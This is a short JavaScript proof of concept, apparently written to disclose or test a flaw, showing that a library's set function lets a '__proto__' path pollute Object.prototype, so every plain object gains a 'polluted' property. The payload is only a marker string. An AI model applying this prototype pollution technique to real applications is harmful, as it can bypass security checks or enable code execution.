const auger = require('../src');

console.log({}.polluted)
auger.set({}, ["__proto__", "polluted"], "Polluted!")
console.log({}.polluted)